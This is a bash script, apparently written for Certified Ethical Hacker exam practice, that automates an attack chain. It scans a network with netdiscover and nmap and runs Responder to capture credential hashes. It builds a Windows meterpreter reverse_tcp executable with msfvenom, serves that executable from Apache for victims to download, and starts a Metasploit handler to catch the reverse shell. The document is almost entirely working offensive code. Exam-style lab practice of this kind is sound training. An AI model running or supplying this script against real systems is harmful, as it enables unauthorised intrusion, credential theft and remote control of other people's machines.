#!/bin/bash

# === CEH Practical Auto Recon Script v2.0 ===
# ⚠️ Run as root. For Kali/Parrot Linux

echo "=== CEH PRACTICAL AUTOMATION SCRIPT ==="

# Prompt for user inputs
read -p "🧠 Interface (e.g., eth0, wlan0): " INTERFACE
read -p "🌐 Network range (e.g., 192.168.1.0/24): " NETWORK
read -p "🎯 Attacker IP (LHOST): " LHOST
read -p "🎯 Listening port (LPORT): " LPORT
read -p "💣 Payload name (e.g., shell.exe): " PAYLOAD_NAME
read -p "📁 Apache directory (default: /var/www/html/share): " WEB_DIR
WEB_DIR=${WEB_DIR:-/var/www/html/share}

# Create timestamped log directory
TIMESTAMP=$(date +"%Y-%m-%d_%H-%M-%S")
LOG_DIR="ceh_logs_$TIMESTAMP"
mkdir -p "$LOG_DIR"

# Step 1: Network Discovery
echo "[*] Running Netdiscover..."
netdiscover -i "$INTERFACE" -r "$NETWORK" > "$LOG_DIR/netdiscover_results.txt"

# Step 2: Nmap Scanning
echo "[*] Running Nmap scans..."
nmap -sn "$NETWORK" -oN "$LOG_DIR/nmap_ping_sweep.txt"
nmap -Pn -A "$NETWORK" -vv --open -oN "$LOG_DIR/nmap_full_scan.txt"

# Step 3: Start Responder
echo "[*] Starting Responder (logs in new terminal)..."
xterm -hold -e "responder -I $INTERFACE | tee $LOG_DIR/responder.log" &

# Step 4: Payload Creation
echo "[*] Creating payload with msfvenom..."
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o "$PAYLOAD_NAME"

# Step 5: Apache Setup
echo "[*] Setting up Apache to host payload..."
mkdir -p "$WEB_DIR"
cp "$PAYLOAD_NAME" "$WEB_DIR/"
chown -R www-data:www-data "$WEB_DIR"
chmod -R 755 "$WEB_DIR"
service apache2 restart

echo "[*] File hosted at: http://$LHOST/share/$PAYLOAD_NAME"

# Step 6: Start Metasploit Handler
echo "[*] Launching Metasploit Handler..."
xterm -hold -e "
msfconsole -q -x '
use exploit/multi/handler;
set payload windows/meterpreter/reverse_tcp;
set LHOST $LHOST;
set LPORT $LPORT;
exploit -j -z;
'
" &

# Summary
echo ""
echo "=== ✅ Setup Complete ==="
echo "Logs saved to: $LOG_DIR"
echo "Payload ready at: http://$LHOST/share/$PAYLOAD_NAME"
echo "Waiting for target connection..."
